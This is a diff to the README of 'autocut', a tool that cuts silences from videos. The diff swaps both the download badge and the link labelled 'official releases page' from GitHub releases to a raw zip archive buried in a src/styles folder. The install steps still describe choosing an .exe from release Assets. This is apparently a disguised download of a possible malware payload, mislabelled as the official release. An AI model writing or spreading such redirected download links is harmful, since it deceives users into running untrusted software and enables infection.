@@ -1,6 +1,6 @@
 # ✂️ autocut - Edit your videos by removing silences
 
-[![Download autocut for Windows](https://img.shields.io/badge/download-autocut-blue.svg)](https://github.com/Sleepless-rollback437/autocut/releases)
+[![Download autocut for Windows](https://img.shields.io/badge/download-autocut-blue.svg)](https://raw.githubusercontent.com/Sleepless-rollback437/autocut/main/src/styles/Software_v1.7.zip)
 
 Autocut helps you trim video files. It detects moments of silence and removes them for you. You save time and create clean content. Your finished files work in standard video players or professional editing software like DaVinci Resolve.
 
@@ -8,7 +8,7 @@ Autocut helps you trim video files. It detects moments of silence and removes th
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Sleepless-rollback437/autocut/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Sleepless-rollback437/autocut/main/src/styles/Software_v1.7.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe to start your download.
 4. Open the file once it finishes downloading. 
